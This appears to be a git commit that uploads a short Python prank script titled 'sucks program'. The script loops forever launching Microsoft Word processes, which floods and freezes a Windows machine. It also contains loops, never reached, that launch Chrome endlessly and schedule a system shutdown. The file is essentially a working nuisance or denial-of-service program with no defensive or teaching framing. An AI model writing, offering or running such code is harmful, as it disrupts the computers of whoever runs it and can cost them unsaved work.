077bcb8cf2d3853c0136fc7470f0e3036c5d63f5
Muhdi hell Code <115169961+muhdi15@users.noreply.github.com>
2022-11-24 10:10:21 +0800

    Add files via upload

---
+++ code 44.py
@@ -0,0 +1,11 @@
+# sucks program
+
+while(True):
+    import os
+
+    while(True):
+        os.system("start winword.exe")
+    while(True):
+        os.system("start chrome.exe")
+    while(True):
+        os.system("shutdown -s -t 20")
